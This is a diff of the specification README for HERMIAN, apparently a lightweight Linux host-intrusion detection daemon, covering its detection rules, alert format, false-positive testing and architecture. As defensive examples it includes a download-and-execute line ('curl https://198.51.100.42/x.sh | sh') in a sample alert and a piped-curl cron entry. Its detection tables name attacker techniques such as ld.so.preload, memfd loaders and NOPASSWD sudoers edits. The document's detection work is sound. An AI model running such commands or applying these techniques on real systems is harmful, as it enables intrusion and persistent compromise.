@@ -1,1005 +1,614 @@
 # HERMIAN
 
-**Silent by default. Loud when it matters.**
+Silent by default. Loud when it matters.
 
-HERMIAN is a lightweight defensive security daemon for Linux systems (and eventually Windows and macOS) that detects high-confidence signs of compromise and alerts — without requiring a dashboard, a SOC, or constant attention.
+HERMIAN is a small security daemon for Linux servers. It watches for a short
+list of things that are very hard to explain as normal activity, and it tells
+you when one of them happens. That's it. No dashboard, no rule language, no
+console to keep open.
+
+This document is the spec. It describes what the code does as of v0.1.0-beta,
+what it deliberately doesn't do, and how we decide what goes in next. Where
+the text and the code disagree, the code is wrong or this file is stale; open
+an issue either way.
+
+Contents
+
+- Who it's for and why it exists
+- Scope, goals, non-goals
+- How detection works
+- The five detection groups, as shipped
+- Severity
+- Alerts
+- False positives, and how we fight them
+- Architecture
+- Data sources
+- Containers
+- Self-protection
+- Notifications
+- Response
+- Installation and packaging
+- Where we are, and what's next
+- Targets we measure against
+- How we work
+- Known hard problems
 
 ---
 
-## Table of Contents
+## Who it's for
 
-1. [Why HERMIAN](#1-why-hermian)
-2. [Project scope](#2-project-scope)
-3. [Goals](#3-goals)
-4. [Non-goals](#4-non-goals)
-5. [Competitive positioning](#5-competitive-positioning)
-6. [Detection philosophy](#6-detection-philosophy)
-7. [Detection catalog — MVP](#7-detection-catalog--mvp)
-8. [Detection hard problems](#8-detection-hard-problems)
-9. [Alert format](#9-alert-format)
-10. [Alert severity](#10-alert-severity)
-11. [False-positive discipline](#11-false-positive-discipline)
-12. [Core architecture](#12-core-architecture)
-13. [Agent architecture — Linux](#13-agent-architecture--linux)
-14. [Container and namespace awareness](#14-container-and-namespace-awareness)
-15. [HERMIAN self-protection](#15-hermian-self-protection)
-16. [Notifications](#16-notifications)
-17. [Response model](#17-response-model)
-18. [Security principles](#18-security-principles)
-19. [Installation](#19-installation)
-20. [Project phases](#20-project-phases)
-21. [KPIs and benchmark methodology](#21-kpis-and-benchmark-methodology)
-22. [MVP success criteria](#22-mvp-success-criteria)
-23. [Way of work](#23-way-of-work)
-24. [Long-term vision](#24-long-term-vision)
+Most Linux hosts on the internet have no host-based detection at all. Not
+because the operator doesn't care, but because every existing option assumes
+someone will tend it:
 
----
+- Falco needs rules written and tuned, and an evening to get quiet.
+- Wazuh and OSSEC want a manager server; for one VPS the manager costs more
+  than the VPS.
+- osquery answers questions but doesn't ask any.
+- auditd is on by default on many systems and read by nobody.
+- Commercial EDR is sold per seat to companies with a SOC.
 
-## 1. Why HERMIAN
+HERMIAN is for the machines those tools skip: a developer's VPS, a small
+team's handful of servers, a homelab, a personal Linux box with SSH exposed.
+The operator is competent but has other work to do. They will install
+something once. They will not tune it. If it pages them for nothing twice,
+they will uninstall it.
 
-The existing landscape covers the problem — but not for the target user.
-
-**Falco** is powerful but requires kernel module or eBPF privileges, YAML rule authoring, and sustained operational attention. Deployment on a single developer server is non-trivial.
-
-**Wazuh / OSSEC** is feature-rich but heavy: it expects centralized infrastructure, a dedicated management server, and continuous tuning. RAM and disk consumption are significant.
-
-**osquery** is a query engine, not a detection daemon. It gives you telemetry but not decisions.
-
-**Commercial EDR** is priced for enterprises and often requires a cloud backend, an agent deployment system, and a human reviewing a dashboard.
-
-HERMIAN targets a different user:
-
-- A developer with one or two internet-facing servers.
-- A sysadmin managing a small fleet without a SOC.
-- A security-conscious user on a personal Linux machine.
-- A small team that wants a lightweight additional detection layer.
-
-The target state is:
+So the bar is:
 
 ```
-install → enable → forget → get notified only when it matters
+install -> enable -> forget -> get one message when something is actually wrong
 ```
 
-No YAML rules. No dashboard. No alert fatigue.
+## Scope
+
+Linux, systemd, kernel 5.4 or newer. x86_64 and aarch64.
+
+Windows and macOS are not in scope and no design work for them has been done.
+The Linux agent has to prove itself on real workloads first; porting a tool
+that's still finding its false positives would mean finding them twice.
+
+## Goals
+
+**Install in under three minutes with nothing to configure.** `apt install`
+the package, or verify and untar the release. Detections are live within ten
+seconds of `hermian enable`. Notifications need one config block and a
+`notify-test`.
+
+**Catch high-confidence compromise.** Five groups of signals, each chosen
+because a legitimate explanation is rare and the malicious one is common.
+Breadth is not a goal. See "Detection groups".
+
+**Cost nothing you'd notice.** Under 1% CPU on average, under 80 MB resident,
+HIGH or CRITICAL delivered to your phone within five seconds of the event.
+Measured on the test host: 0.1% CPU, 19 MB RSS, roughly two seconds.
+
+**Explain every alert.** What happened, the process chain or file that did
+it, why we think it matters, what to do first. In plain language. No scores.
+
+## Non-goals
+
+HERMIAN will not become a SIEM, a log shipper, a vulnerability scanner, a
+packet capture tool, a compliance product, a sandbox, or a dashboard. It will
+not grow to hundreds of rules. It will not ship anything described as "AI".
+
+The test for a new feature: does it improve detection quality, make an alert
+clearer, or make response safer? If not, it waits.
 
 ---
 
-## 2. Project scope
+## How detection works
 
-**Current scope:** Linux only.
+Every rule is deterministic and reads its context from a process tree the
+daemon keeps in memory. A finding is the product of several facts, never one:
 
-Windows and macOS are planned but explicitly post-MVP. No architecture decisions for those platforms will be made until the Linux agent is validated in production workloads.
-
-Expanding scope prematurely is how tools become mediocre everywhere instead of good somewhere.
-
----
-
-## 3. Goals
-
-### G1 — Frictionless, secure deployment
-
-A user should be able to install HERMIAN in under 3 minutes.
-
-**Target installation flow:**
-
-```bash
-# Verify the release before doing anything (Sigstore, keyless)
-cosign verify-blob SHA256SUMS --bundle SHA256SUMS.sigstore \
-  --certificate-identity-regexp '^https://github.com/hermian-security/hermian/' \
-  --certificate-oidc-issuer https://token.actions.githubusercontent.com
-sha256sum -c SHA256SUMS --ignore-missing
-
-# Or via system package manager (preferred)
-sudo apt install hermian        # Debian/Ubuntu
-sudo dnf install hermian        # Fedora/RHEL
-sudo pacman -S hermian          # Arch
-
-# Enable
-sudo hermian enable
+```
+which process        (comm, resolved exe path, previous images if it re-exec'd)
+its ancestry         (full chain to PID 1, with roles: web server, shell, downloader...)
+who                  (uid, and whether any ancestor is an interactive session)
+where the file lives (transient dir? overlayfs? package-owned?)
+what else happened   (was this chain flagged in the last two minutes?)
+when                 (during the learning window? off-hours?)
 ```
 
-> **Note on `curl | sudo sh`:** This pattern is explicitly banned for HERMIAN.  
-> Piping an unverified remote script directly to root is the exact behavior HERMIAN exists to detect.  
-> The installer must be signed, verifiable, and distributed through package managers or with explicit checksum/GPG verification steps.
+The same raw event lands at different severities depending on that context:
 
-After installation, core detections must be active within 60 seconds with no configuration required.
-
-### G2 — Detect high-confidence compromise signals
-
-Focus on behaviors that are genuinely difficult to explain as normal activity in context.
-
-See [Section 7 — Detection catalog](#7-detection-catalog--mvp) for MVP detections.
-
-### G3 — Extremely low operational overhead
-
-Resource targets (see [Section 21](#21-kpis-and-benchmark-methodology) for benchmark methodology):
-
-- `< 1%` average CPU on idle and normal workloads
-- `< 80 MB RSS` steady-state
-- `< 5s` detection-to-notification latency for HIGH/CRITICAL events
-
-### G4 — Explain every alert
-
-An alert must answer:
-
-- What happened?
-- Why does HERMIAN consider this suspicious?
-- What triggered it?
-- What should the user do?
-
-No opaque scores. No unexplained severity. See [Section 9 — Alert format](#9-alert-format).
-
----
-
-## 4. Non-goals
-
-HERMIAN must not become:
-
-- A SIEM or centralized log collector
-- A full EDR replacement
-- A vulnerability management platform
-- A packet capture / DPI platform
-- A malware sandbox
-- A compliance platform
-- A dashboard requiring continuous monitoring
-- An ML product marketed as intelligent without measurable benefit
-- A collection of hundreds of low-confidence detections
-
-If a proposed feature does not directly improve detection, explanation, or safe response — it is deferred.
-
----
-
-## 5. Competitive positioning
-
-| Tool | Strength | Why HERMIAN is different |
+| Event | Context | Result |
 |---|---|---|
-| Falco | Powerful eBPF/kernel rules | Requires rule authoring, infra overhead |
-| Wazuh | Feature-complete | Heavy, centralized, requires tuning |
-| osquery | Flexible telemetry | Query engine, not a detection daemon |
-| auditd | Native kernel audit | Noisy, requires expert configuration |
-| HERMIAN | Opinionated defaults, local detection, zero dashboard | Targeted at the non-SOC user |
+| bash spawned by sshd | interactive session | ignored |
+| bash spawned by nginx | web server | HIGH |
+| nginx -> bash -> curl -> /tmp/x runs | web server | CRITICAL |
+| /etc/cron.d/job written | vim over SSH | INFO |
+| /etc/cron.d/job written | no session anywhere on the host | HIGH |
+| ...and the line is `curl ... \| sh` | | CRITICAL |
+| /etc/shadow renamed into place | useradd ran 2 s ago | ignored |
+| /etc/shadow renamed into place | nothing ran, no session | CRITICAL |
+| /tmp/installer.sh executed | from your terminal | LOW |
+| /tmp/installer.sh executed | by a service, no session | HIGH |
 
-HERMIAN does not try to beat these tools on features. It tries to beat them on time-to-useful-protection for a single host.
+The one piece of statistics we use is a set-membership baseline: for the first
+24 hours after install the daemon records SSH sources, outbound peers of each
+program, and external destinations of web servers. After that, "never seen
+before" is a fact a rule can use. This is a `HashSet`, not a model.
+
+### Session attribution
+
+Half of all false positives in file-based rules come from one question: was a
+human at the keyboard when this file changed? inotify doesn't say. We answer
+it in layers:
+
+1. If the writing process still has the file open when we look, we know the
+   pid; walk its ancestry for a TTY or a session daemon (sshd, login, sudo,
+   tmux, ...).
+2. Editors write via temp file and rename, so the writer is usually gone. If
+   a user-management tool, `visudo`, or a package manager ran in the last
+   eight seconds, the change is theirs.
+3. Otherwise: is there any interactive session on the host at all? If yes,
+   the change is "likely interactive" and lands at INFO. If no, it's
+   "likely unattended" and lands at HIGH.
+
+Layer 3 is a heuristic and it cuts both ways: a permanently open tmux session
+makes everything look interactive. It is also where a real eBPF file-write
+hook would replace guessing with knowing. That's on the list.
 
 ---
 
-## 6. Detection philosophy
+## Detection groups, as shipped
 
-### Deterministic, contextual detection first
+Each rule below exists in `hermian-core/src/detect/`. Severities are the ones
+the code emits.
 
-HERMIAN uses rule-based detection grounded in context — not volume-based correlation or black-box scoring.
+### D1: process chains
 
-A detection combines multiple contextual signals:
-
-```
-parent process
-+ child process
-+ user
-+ command arguments
-+ execution path
-+ privilege level
-+ system role
-+ timing relative to other events
-```
-
-### On statistics
-
-Behavioral baselines using simple statistics (moving averages, per-source thresholds, login frequency) are acceptable where they improve signal quality. This is distinct from "ML" in the marketing sense.
-
-Example of acceptable use: flagging an SSH source that has never authenticated to this host before, combined with a root login. This is a threshold + novelty check — not a model.
-
-Opaque model-driven scoring with no interpretable reason is not acceptable.
-
-### Context determines signal value
-
-The same event can be noise or a strong signal depending on context:
-
-| Event | Context | Signal |
+| Rule | Severity | Notes |
 |---|---|---|
-| `bash` spawned by `sshd` | Interactive SSH session | Ignore |
-| `bash` spawned by `nginx` | Production web server | HIGH |
-| `bash` spawned by `nginx` → `curl` → exec in `/tmp` | Production web server | CRITICAL |
-| `cron` job added | Admin running `crontab -e` | INFO |
-| `cron` job added | No active session, file written directly | HIGH |
+| web server -> shell | HIGH | nginx, apache, caddy, php-fpm, gunicorn, uwsgi, puma, tomcat, traefik, haproxy, envoy, ... |
+| database -> shell | HIGH | mysqld, postgres, mongod, redis, elasticsearch, clickhouse, etcd, vault, ... |
+| web server -> shell -> curl/wget | HIGH | |
+| web server -> shell -> downloader -> anything executes | CRITICAL | |
+| exec from /tmp, /dev/shm, /var/tmp | LOW / HIGH / CRITICAL | interactive or under a package manager / unattended / inside a chain already flagged |
+| exec from a deleted inode or a memfd | HIGH | caught via `execveat` too, which is how `fexecve` and memfd loaders work |
+| shell -> interpreter, unattended | INFO | context only, never notified |
 
----
+Container entrypoints (a process whose parent is the container's PID 1) are
+exempt from the web/db -> shell rules.
 
-## 7. Detection catalog — MVP
+A HIGH or CRITICAL D1 finding "flags" the chain for ten minutes. D1 and D5 use
+that to escalate what happens next. Init, sshd and cron are never flagged, so
+one alert can't taint every process on the box.
 
-MVP covers exactly **5 detection groups**. Each must achieve the [false-positive targets](#11-false-positive-discipline) before being shipped.
+### D2: SSH and authentication
 
-### D1 — Suspicious process chains
-
-Detect process parent/child relationships that are anomalous in context.
-
-**Strong signals:**
-
-```
-web-server-process → sh/bash → (curl/wget/python/perl/ruby) → exec
-database-process → sh/bash
-any-process → exec from /tmp /dev/shm /var/tmp
-any-process → exec from deleted inode
-```
-
-**Weaker signals (INFO only unless chained):**
-
-```
-shell → script → exec (depends on parent and user)
-package-manager → network connection (rare, flag for review)
-```
-
-**Implementation:** `/proc` monitoring + eBPF `exec` tracepoints (via `aya-rs`).
-
-**False-positive risk:** CI/CD pipelines, build systems, package post-install scripts. Requires a configurable allowlist at the process-chain level.
-
----
-
-### D2 — SSH and authentication abuse
-
-**Signals:**
-
-- Root SSH login (unless explicitly permitted in config)
-- New `authorized_keys` entry added while no active user session owns the file
-- SSH config modification (`/etc/ssh/sshd_config`, `~/.ssh/config`)
-- Failed authentication burst: N failures from same source within T seconds (configurable threshold)
-- Successful authentication from a source that has never authenticated before combined with unusual timing (off-hours, root, or first-time source)
-- New system account created or existing account added to sudo/wheel/admin
-
-**Implementation:** PAM hooks + `/proc` + inotify on SSH key files and config.
-
-**False-positive risk:** Automated deployments (Ansible, Terraform) adding keys, legitimate new SSH sources. Requires per-host baseline period for "known sources."
-
----
-
-### D3 — Persistence modification
-
-**Signals — Linux:**
-
-| Location | Event | Severity |
+| Rule | Severity | Notes |
 |---|---|---|
-| `/etc/cron*`, `/var/spool/cron/*` | New entry, no associated interactive session | HIGH |
-| `~/.bashrc`, `~/.profile`, `/etc/profile.d/*` | Modified, no associated interactive session | HIGH |
-| `/etc/systemd/system/*` | New unit file created | HIGH |
-| `systemd` service enabled | New service not in package database | HIGH |
-| `/etc/ld.so.preload` | Any modification | CRITICAL |
-| `/etc/ld.so.conf.d/*` | New entry pointing to non-standard path | HIGH |
-| `authorized_keys` | Added entry (any conditions) | HIGH |
+| root login over SSH, first time from this source | HIGH | INFO on repeats from the same source; disabled by `ssh.permit_root = true` |
+| failed-auth burst | HIGH | 5 attempts in 60 s from one source by default; fires once when the threshold is crossed |
+| login from a source never seen in the baseline | LOW | HIGH if root or off-hours (22:00 to 06:00 UTC by default) |
+| sshd_config / ssh_config / ~/.ssh/config changed | INFO / HIGH | interactive / unattended |
+| new account or uid change in /etc/passwd | LOW / HIGH | HIGH if uid 0 or unattended |
+| new member of sudo, wheel, admin, root | HIGH | |
 
-**Implementation:** inotify + `/proc` correlation to associate file writes with processes.
+Auth events come from the optional PAM module if installed, else
+`/var/log/auth.log` or `/var/log/secure`, else `journalctl -f` on sshd. The
+timestamp is parsed from the log line so bursts are measured correctly even
+if the daemon was briefly behind.
 
-**False-positive risk:** Package managers, CM tools (Ansible, Puppet, Chef). The "no associated interactive session" heuristic handles most of this; CM tool processes should be in the allowlist.
+### D3: persistence
 
----
-
-### D4 — Privilege escalation indicators
-
-**Signals:**
-
-- SUID/SGID binary created in non-standard locations
-- `ptrace` call by a non-debugger process on an unrelated process
-- `LD_PRELOAD` set in environment of an exec call
-- Capabilities granted to a process or binary unexpectedly
-- `/etc/sudoers` or `/etc/sudoers.d/*` modified
-- `/etc/passwd` or `/etc/shadow` modified outside of `useradd`/`passwd`/`usermod`
-
-**Implementation:** eBPF `syscall` tracepoints for `ptrace`, `execve` environment inspection, inotify for config files.
-
-**False-positive risk:** Debuggers (gdb, strace), container runtimes. These must be in the allowlist or context-filtered.
-
----
-
-### D5 — Anomalous network behavior in context
-
-**Scope:** Not full packet capture. Only connection metadata correlated with process context.
-
-**Signals:**
-
-- New outbound connection from a process that has never made outbound connections before, combined with another compromise indicator
-- Outbound connection from a process chain flagged in D1
-- Unexpected listener on a new port (short-lived or otherwise)
-- Connection to a new external destination from a web server process
-
-**Implementation:** eBPF socket tracepoints + netlink. No DPI.
-
-**Note:** Standalone network events are LOW or INFO. They become HIGH/CRITICAL only when correlated with D1–D4.
-
----
-
-## 8. Detection hard problems
-
-These are explicitly acknowledged as hard. MVP does not claim to solve them. They are documented to avoid overconfidence.
-
-### LOLBins (Living off the Land)
-
-An attacker using `python3`, `curl`, `wget`, `openssl`, `nc`, or other legitimate system binaries leaves no anomalous process name. Detection requires:
-
-- Behavioral context (what's the parent, what's the destination)
-- Argument inspection
-- Baseline deviation
-
-HERMIAN D1 partially addresses this through parent context. Full LOLBin coverage requires behavioral baselines — planned for post-MVP.
-
-### Process injection / fileless execution
-
-No child process is created. Attacks via `ptrace`, `memfd_create`, `/proc/PID/mem` writes, or shared library injection leave no `execve` call. Detection requires eBPF syscall monitoring at a level beyond D1.
-
-D4 partially addresses `ptrace`. Full coverage is a post-MVP detection class.
-
-### Container environments
-
-`/proc` namespace isolation, overlayfs, and cgroup-based process trees can break assumptions HERMIAN makes about parent/child relationships and system role inference. See [Section 14](#14-container-and-namespace-awareness).
-
-### Attacker targeting HERMIAN itself
-
-See [Section 15](#15-hermian-self-protection).
-
-### Advanced lateral movement
-
-SMB, RPC, and credential reuse do not generate suspicious process chains on the *source* host. Detection requires correlation across hosts — a Phase 6 capability.
-
----
-
-## 9. Alert format
-
-Every alert must be human-readable with no prior security training required.
-
-```
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🚨 HERMIAN — CRITICAL
-
-Host:      web-prod-01
-Time:      2025-09-14 03:17:42 UTC
-Detection: D1 — Suspicious process chain
-
-What happened:
-  A web server process spawned a shell, which downloaded
-  and executed content from a remote host.
-
-Process chain:
-  nginx (www-data, PID 1842)
-    └── bash (www-data, PID 3107)
-         └── curl https://198.51.100.42/x.sh | sh
-
-Why this matters:
-  Web servers do not normally spawn interactive shells.
-  This chain is consistent with remote code execution via
-  a web application vulnerability.
-
-Recommended action:
-  1. Isolate this host from the network if the activity
-     is unexpected.
-  2. Review nginx access logs around 03:17 UTC.
-  3. Identify what triggered the request to
-     /x.sh on 198.51.100.42.
-
-HERMIAN ref: HER-2025-0914-001
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-```
-
-**Rules:**
-
-- No unexplained scores.
-- Every alert names the detection rule that triggered it.
-- Every HIGH/CRITICAL alert includes a recommended action.
-- The "why this matters" section must be written in plain language.
-
----
-
-## 10. Alert severity
-
-| Level | Meaning | Default action |
+| Path | Severity | Notes |
 |---|---|---|
-| INFO | Potentially useful context, not immediately actionable | Log only |
-| LOW | Suspicious, warrants later review | Log, optional notification |
-| HIGH | Strong indication of malicious or unauthorized activity | Notify |
-| CRITICAL | High-confidence compromise or dangerous persistence/privilege change | Notify immediately, optional response |
+| /etc/ld.so.preload | CRITICAL | always; lists the libraries |
+| /etc/ld.so.conf.d/* with a non-standard path | HIGH | LOW if a package manager wrote it |
+| cron (/etc/crontab, cron.d, cron.*, /var/spool/cron) | INFO / HIGH / CRITICAL | interactive / unattended / the command downloads and pipes to a shell |
+| shell profiles (system and per-user, bash and zsh) | INFO / HIGH | |
+| systemd units and .wants/.requires links under /etc | INFO / HIGH / CRITICAL | package-owned units are ignored; CRITICAL if ExecStart is in a transient dir |
+| authorized_keys | INFO / HIGH | |
 
-**What severity is not:**
+Editor artifacts (`.swp`, `~`, `4913`, `tmp.XXXXXX`, `.dpkg-new`, ...) never
+trigger a rule. Anything under a container overlay is ignored.
 
-- A confidence score
-- A risk rating
-- A CVSS-like composite
+### D4: privilege escalation
 
-Severity maps directly to: *what should the user do right now?*
+| Rule | Severity | Notes |
+|---|---|---|
+| setuid/setgid file appears under /tmp, /var/tmp, /dev/shm, /home, /root, /var/www, /srv, /opt | CRITICAL | inotify plus a 20 s sweep, because `chmod` leaves no exec event |
+| file capabilities set on a binary in those places | HIGH | |
+| ptrace ATTACH or SEIZE by a non-debugger on an unrelated process | HIGH | debuggers, container runtimes and a process's own descendants are exempt; LOW when the target is unprivileged |
+| LD_PRELOAD in an exec's environment | INFO / HIGH | interactive or under a build tool / unattended |
+| sudoers edited outside visudo | LOW / HIGH / CRITICAL | interactive / unattended / adds NOPASSWD unattended |
+| shadow or gshadow written outside the user tools | HIGH / CRITICAL | |
+
+### D5: network, in context
+
+| Rule | Severity | Notes |
+|---|---|---|
+| outbound connection from a chain D1 flagged in the last two minutes | HIGH | |
+| web server connects to an external address never seen in the baseline | HIGH | |
+| a program makes its first outbound connection since the baseline | LOW external / INFO private | |
+| new listening port | INFO | LOW from a shell or interpreter, HIGH from a flagged or /tmp-resident process |
+
+DNS, NTP, DHCP and mDNS ports are ignored. RFC 1918, link-local, loopback,
+CGNAT and v4-mapped v6 count as private. Standalone network events never
+reach HIGH on their own.
+
+### Self-protection (SELF)
+
+Not a detection group, but it produces alerts through the same pipeline:
+binary or config hash mismatch at startup (CRITICAL), config changed while
+running (CRITICAL, with a summary of what changed, whether it validated, and
+the new hash), and a single INFO on first start to prove the alert path.
 
 ---
 
-## 11. False-positive discipline
+## Severity
 
-This is the primary product problem. A tool that cries wolf is worse than no tool — it trains users to ignore alerts.
+| Level | Meaning | Default |
+|---|---|---|
+| INFO | context; useful when reading a timeline later | logged |
+| LOW | worth a look when you're next at a terminal | logged; notified if `min_severity = "LOW"` |
+| HIGH | you should look today | logged and notified |
+| CRITICAL | you should look now | logged, notified, may isolate if you opted in |
 
-### Target
+Severity is the answer to "what should I do right now". It is not a
+confidence score and it doesn't combine into anything.
+
+Identical findings (same rule, same key) inside a five-minute window are
+folded into the first alert. When the window closes, one LOW summary says how
+many times it repeated. INFO repeats are dropped without a summary. A finding
+that comes back at a higher severity breaks through the window immediately.
+
+---
+
+## Alerts
+
+Every alert renders from one structure: title, host, time, rule, a plain
+paragraph of what happened, the process chain with users and pids, key facts,
+why it matters, and numbered next steps. The same structure is written to
+journald and the log file as fixed-width text, to a terminal with colour, to
+email as text plus HTML, and to Telegram as a short HTML message with the full
+text attached in a monospace block.
 
 ```
-< 1 false HIGH or CRITICAL alert per host per month
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+■■■■ HERMIAN  CRITICAL                                 HER-2025-0914-001
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Web server chain downloaded and executed remote content
+
+  Host        web-prod-01
+  Time        2025-09-14 03:17:42 UTC
+  Detection   D1 Suspicious process chain
+
+WHAT HAPPENED
+  nginx spawned a shell, the shell ran curl to fetch content, and that
+  content is now executing as sh (pid 3110).
+
+  systemd  root · pid 1
+  └─ nginx  www-data · pid 1842
+     └─ bash  www-data · pid 3107
+        └─ curl  www-data · pid 3109
+           └─ sh  www-data · pid 3110
+                /tmp/.x.sh
+
+  Executable  /tmp/.x.sh
+
+WHY THIS MATTERS
+  Web server, shell, downloader, execution: this exact sequence is the
+  signature of remote code execution - an attacker exploiting the
+  application, staging a payload, and running it.
+
+RECOMMENDED ACTION
+   1. Isolate this host from the network unless the activity is known
+      and expected.
+   2. Preserve the executed file and the process memory for analysis.
+   3. Review web server access logs around the alert time to find the
+      entry point.
+
+────────────────────────────────────────────────────────────────────────
+hermian show HER-2025-0914-001         hermian collect HER-2025-0914-001
 ```
 
-This must be measured against realistic workloads, not idle VMs.
+Reference ids are `HER-YYYY-MMDD-NNN`, sequential per day, and survive a
+daemon restart. Each alert is also stored as JSON under
+`/var/lib/hermian/alerts/` so `hermian show`, `hermian alerts --json` and
+`hermian collect` can work on it later.
 
-### Testing methodology
+---
 
-Every detection in [Section 7](#7-detection-catalog--mvp) must pass a false-positive test suite before release:
+## False positives
 
-**Test environments:**
+This is the product problem. A tool that pages you for nothing teaches you to
+ignore it, and then it's worse than no tool.
 
-- Idle server (no active user, only cron and system services)
-- Active web server (nginx/Apache + PHP/Python app under load)
-- Active developer workstation (compilation, Docker, package installs)
-- SSH-active server (multiple users, Ansible runs, file transfers)
-- CI/CD host (automated test runners, build pipelines)
+Target: fewer than one false HIGH or CRITICAL per host per month, on hosts
+doing real work.
 
-**For each environment, verify:**
+### What we do about it
 
-1. HERMIAN generates zero HIGH/CRITICAL alerts during 72 hours of normal operation.
-2. A simulated attack scenario in the same environment generates a HIGH/CRITICAL alert within 5 seconds.
-
-### Allowlist system
-
-Every detection must support a structured allowlist:
+- Session attribution (above), so operator activity lands at INFO.
+- Role tables for the processes that legitimately touch every persistence
+  surface: package managers, config management, user tools, `visudo`,
+  `crontab`, `systemctl`, `ldconfig`. Their writes are recognised, not
+  allowlisted.
+- Editor and packaging temp files are filtered before any rule runs.
+- The baseline window, so novelty rules have something to compare against.
+- Standalone network and interpreter events cap at LOW.
+- A structured allowlist with a mandatory `reason`, so the config file is the
+  audit trail of every suppression decision:
 
 ```toml
-[allowlist]
-# Suppress D1 alerts for this specific chain
-[[allowlist.process_chain]]
+[[allowlist.process_chains]]
 parent = "deploy-agent"
 child  = "bash"
 user   = "deploy"
 reason = "CI/CD deployment pipeline"
 
-# Suppress D3 alerts for this cron path
 [[allowlist.persistence]]
-path   = "/var/spool/cron/crontabs/deploy"
-reason = "Managed by Ansible"
+path   = "/etc/cron.d/app-*"
+reason = "written by the app's scheduler"
 ```
 
-Allowlist entries require a `reason` field. This is non-optional — it creates an audit trail of suppression decisions.
+### How we test it
 
-### Baseline period
+Two scripts under `tests/`:
 
-On first install, HERMIAN enters a 24-hour observation period for D2 (SSH sources) during which it learns the set of known-good SSH sources. After the baseline period, novel sources trigger alerts. This is not ML — it is a set membership check with a TTL.
+- `attacks/run_attack.sh` runs one of thirteen simulated attacks detached
+  from any session and asserts a HIGH or CRITICAL with the expected title.
+- `false_positives/run_false_positive.sh` runs an operator workload
+  (editing cron and sudoers, adding and removing users, enabling units,
+  `ssh-copy-id`, installers from /tmp, apt, strace, unshare) or an unattended
+  one (apt, unattended-upgrade, logrotate, tmpfiles, ldconfig, pip, snap,
+  cron-style jobs) and asserts zero HIGH or CRITICAL.
 
-The baseline period can be skipped with `--no-baseline` for fresh servers.
+`tests/soak/` starts a clock on a host and snapshots alert counts hourly;
+`report.sh` prints pass or fail against the 72-hour gate.
+
+Results on the first host (Ubuntu 22.04, kernel 5.15, 2 vCPU): 13 of 13
+attacks detected at the expected severity; 0 HIGH or CRITICAL across both
+workloads. Eight more environments are listed in `docs/ROADMAP-BURN-IN.md`
+and haven't been run yet. Until they have, this section describes an
+intention with one data point behind it.
 
 ---
 
-## 12. Core architecture
+## Architecture
 
 ```
-                         HERMIAN
-                            │
-                     Linux Agent (MVP)
-                            │
-              ┌─────────────┼─────────────┐
-              │             │             │
-           eBPF          /proc         inotify
-         tracepoints    polling       watchers
-              │             │             │
-              └─────────────┼─────────────┘
-                            │
-                    Event normalization
-                            │
-                   Context enrichment
-                   (user, path, chain)
-                            │
-                    Detection engine
-                            │
-              ┌─────────────┴─────────────┐
-              │                           │
-         No match                    Rule match
-              │                           │
-           Discard               Severity assessment
-                                          │
-                          ┌───────────────┼───────────┐
-                          │               │           │
-                        INFO             LOW       HIGH/CRITICAL
-                          │               │           │
-                        Log           Log +       Log + notify
-                                    optional      + optional
-                                    notify        response
+  eBPF tracepoints      inotify          /proc, /proc/net       auth log / journald / PAM
+  sched_process_exec    persistence      process tree seed      sshd events
+  sys_enter_execve*     account files    listener poller
+  sys_enter_connect     config file      setuid sweeper
+  sys_enter_ptrace      (debounced,
+                         writer captured
+                         on first event)
+          │                 │                  │                        │
+          └─────────────────┴────────┬─────────┴────────────────────────┘
+                                     │  Event  (Exec, File, Connect, Ptrace, Auth, Listener)
+                                     ▼
+                              hermian-core::Engine
+                    process tree · roles · baseline · flags · allowlist
+                                     │
+                              D1  D2  D3  D4  D5  SELF
+                                     │  Finding
+                                     ▼
+                                  dedup
+                                     │  Alert (ref id, host, time)
+                                     ▼
+                                 notifier
+              always: JSON store, journald, alerts.log
+              at min_severity+: telegram, email, webhook, stdout  (retry, backoff, per-channel)
 ```
 
-**Local-first.** No event is sent to a remote backend for a detection decision. The agent decides locally.
+The engine is a separate crate with no I/O. It takes events and returns
+alerts, and its 77 tests run on any OS. Everything platform-specific lives in
+the daemon crate.
 
-The backend (when configured) receives alert notifications only — not raw event streams.
+Nothing leaves the host except alerts you've configured a channel for. No
+event stream goes anywhere. There is no listener.
 
----
+## Data sources
 
-## 13. Agent architecture — Linux
-
-### Language
-
-**Rust.**
-
-Rationale:
-- Memory safety is non-negotiable for a root-privileged daemon.
-- `aya-rs` provides a production-ready eBPF toolkit in Rust with no C dependency requirement at compile time.
-- Single static binary, minimal deployment surface.
-- Performance predictability matters for the CPU overhead target.
-
-Go was considered. Go's eBPF ecosystem (`cilium/ebpf`) is mature, but Go's garbage collector introduces latency unpredictability and memory overhead that conflicts with the resource targets. For a daemon that processes events continuously, Rust is the correct choice here.
-
-### Data sources
-
-| Source | Used for | Mechanism |
+| What | How | Notes |
 |---|---|---|
-| eBPF `execve` tracepoint | Process creation chains | `aya-rs` |
-| eBPF `sys_enter_connect` | Outbound connection tracking | `aya-rs` |
-| eBPF `sys_enter_ptrace` | Ptrace detection | `aya-rs` |
-| `/proc/<pid>/stat` | Process metadata enrichment | Polling |
-| `/proc/<pid>/cmdline` | Argument inspection | Polling |
-| `/proc/<pid>/status` | UID/GID, capability sets | Polling |
-| inotify | Persistence paths, SSH config, sudoers | `libc`/`nix` |
-| PAM (optional module) | Authentication events | PAM hook |
-| `netlink` AUDIT | Fallback where eBPF unavailable | Kernel audit |
+| process exec | eBPF `sched/sched_process_exec` | fires after the new image is live, so comm and path are right; `sys_enter_execve` and `execveat` only stash argv0, LD_PRELOAD presence, and the execveat flag |
+| parent pid | `task_struct->real_parent->tgid` read in eBPF | offsets come from the kernel's BTF at load; exact even if the parent already exited |
+| outbound connect | eBPF `sys_enter_connect` | v4 and v6 |
+| ptrace | eBPF `sys_enter_ptrace` | |
+| file changes | inotify on a fixed list of files and directories | events per path are debounced 400 ms (max 2.5 s), writer looked up on the first event |
+| process metadata | /proc | ancestry seeding, container detection via cgroup and pid namespace |
